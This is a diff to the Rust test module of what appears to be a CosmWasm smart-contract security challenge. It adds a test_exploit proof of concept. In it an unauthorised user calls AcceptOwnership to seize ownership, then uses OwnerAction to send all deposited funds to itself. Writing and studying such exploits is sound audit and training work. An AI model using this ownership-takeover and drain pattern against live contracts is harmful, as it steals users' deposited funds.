@@ -3,7 +3,7 @@ pub mod tests {
     use crate::contract::DENOM;
     use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
     use crate::state::State;
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, Empty, Uint128, CosmosMsg, BankMsg};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -15,6 +15,7 @@ pub mod tests {
         Box::new(contract)
     }
 
+    pub const USER0: &str = "user0";
     pub const USER1: &str = "user1";
     pub const USER2: &str = "user2";
     pub const ADMIN: &str = "admin";
@@ -229,5 +230,69 @@ pub mod tests {
                 proposed_owner: None,
             }
         );
+    }
+
+    /**/
+    #[test]
+    fn test_exploit(){
+        let (mut app, contract_addr) = proper_instantiate();
+        //USER1 deposits funds 
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit{},
+            &vec![coin(10000, DENOM)],
+        ).unwrap();
+
+        //USER2 deposits funds
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit{},
+            &vec![coin(8000, DENOM)],
+        ).unwrap();
+
+        //USER0 claims ownership
+        app.execute_contract(
+            Addr::unchecked(USER0),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptOwnership {},
+            &vec![]
+        ).unwrap();
+
+        let contract_bal = app.wrap().query_balance(contract_addr.to_string(), DENOM).unwrap();
+        println!("contract balance after deposits: {:?}", contract_bal);
+        //owner should now be USER0
+        let new_state: State = app.wrap().query_wasm_smart(
+            contract_addr.clone(),
+            &QueryMsg::State{}
+        ).unwrap();
+        assert_eq!(
+            new_state, 
+            State {
+                current_owner: Addr::unchecked(USER0),
+                proposed_owner: None,      
+            }
+        );
+
+        //USER0 calls owner action to send in bank msg
+        //sends all contract funds to themselvs
+        let action_msg = CosmosMsg::Bank(
+            BankMsg::Send{
+                to_address: USER0.to_string(),
+                amount: vec![coin(18000, DENOM)]
+            }
+        );
+        app.execute_contract(
+            Addr::unchecked(USER0), 
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction{
+                msg: action_msg,
+            },
+            &vec![],
+        ).unwrap();
+
+        let new_bal = app.wrap().query_balance(USER0, DENOM).unwrap();
+        assert_eq!(new_bal.amount, Uint128::new(18000));
     }
 }
